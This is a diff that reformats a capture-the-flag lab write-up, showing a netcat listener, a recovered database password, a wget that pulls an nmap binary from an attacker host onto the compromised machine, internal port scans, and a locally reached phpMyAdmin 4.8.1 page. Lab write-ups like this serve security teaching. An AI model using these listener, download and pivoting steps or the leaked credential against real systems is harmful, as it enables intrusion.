@@ -18,7 +18,7 @@ Note: While being very linear, this room can be solved in various ways. To get t
 
 <p><em>Answer tbe questions below</em></p>
 
-
+<br>
 <h2>nmap</h2>
 
 ```bash
@@ -27,6 +27,8 @@ Note: While being very linear, this room can be solved in various ways. To get t
 PORT   STATE SERVICE
 22/tcp open  ssh
 ```
+
+<br>
 
 ```bash
 :~# nc -nlvp 81
@@ -168,13 +170,15 @@ for product in cursor.fetchall():
     print(f'We have {product[2]}x {product[1]}')
 ```
 
-```bash
- host='localhost', 
-    database='app', 
-user = app
-password = s4Ucbrme
-```
+<p>
 
+- host = localhost<br>
+- database = app<br>
+- user = app<br>
+- password = s4Ucbrme</p>
+
+<br>
+<br>
 <h2>mysql</h2>
 
 ```bash
@@ -241,25 +245,28 @@ ada@...:/tmp$ wget http://xx.xxx.xx.xxx:8888/nmap-x64.tar.gz -o nmap
 ada@...:/tmp$ tar -xzf nmap-x64.tar.gz
 ```
 
+<p>
+
+- 22 : ssh<br>
+- 80 : http<br>
+- 3306 : mysql<br>
+- 3060 : mysqlx</p>
+
 ```bash
 ada@...:/tmp$ ./nmap -sT -p- 127.0.0.1
-Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-xx xx:xx UTC
-Nmap scan report for 127.0.0.1 (127.0.0.1)
-Host is up (0.00014s latency).
-rDNS record for 127.0.0.1: localhost
-Not shown: 65531 closed ports
+...
 PORT      STATE SERVICE
 22/tcp    open  ssh
 80/tcp    open  http
 3306/tcp  open  mysql
 33060/tcp open  mysqlx
-
-Nmap done: 1 IP address (1 host up) scanned in 3.01 seconds
 ```
+
+<br>
 
 ```bash
 ada@...:~$ curl http://localhost:80/
-<!DOCTYPE HTML><html lang='en' dir='ltr'><head><meta charset="utf-8" /><meta name="referrer" content="no-referrer" /><meta name="robots" content="noindex,nofollow" /><meta http-equiv="X-UA-Compatible" content="IE=Edge" /><meta name="viewport" content="width=device-width, initial-scale=1.0"><style id="cfs-style">html{display: none;}</style><link rel="icon" href="favicon.ico" type="image/x-icon" /><link rel="shortcut icon" href="favicon.ico" type="image/x-icon" /><link rel="stylesheet" type="text/css" href="./themes/pmahomme/jquery/jquery-ui.css" /><link rel="stylesheet" type="text/css" href="js/vendor/codemirror/lib/codemirror.css?v=4.8.1" /><link rel="stylesheet" type="text/css" href="js/vendor/codemirror/addon/hint/show-hint.css?v=4.8.1" /><link rel="stylesheet" type="text/css" href="js/vendor/codemirror/addon/lint/lint.css?v=4.8.1" /><link rel="stylesheet" type="text/css" href="phpmyadmin.css.php?nocache=4712093054ltr&amp;server=1" /><link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.8.1" media="print" id="printcss"/><title>phpMyAdmin</title><script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.min.js?v=4.8.1"></script>
+<!DOCTYPE HTML>... href="phpmyadmin.css.php?nocache=4712093054ltr&amp;server=1" /><link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.8.1" media="print" id="printcss"/><title>phpMyAdmin</title><script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.min.js?v=4.8.1"></script>
 <script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery-migrate.js?v=4.8.1"></script>
 <script data-cfasync='false' type='text/javascript' src='js/whitelist.php?v=4.8.1&amp;lang=en'></script>
 <script data-cfasync="false" type="text/javascript" src="js/vendor/sprintf.js?v=4.8.1"></script>
@@ -308,8 +315,10 @@ $(function() {AJAX.fireOnload("whitelist.php");AJAX.fireOnload("vendor/sprintf.j
 
 <br>
 <br>
-<p>Welcome to <bdo dir="ltr" lang="en">phpMyAdmin</bdo></p>
 
+<p>
+    
+- Welcome to ...phpMyAdmin</bdo></p>
 
 ```bash
 <noscript>
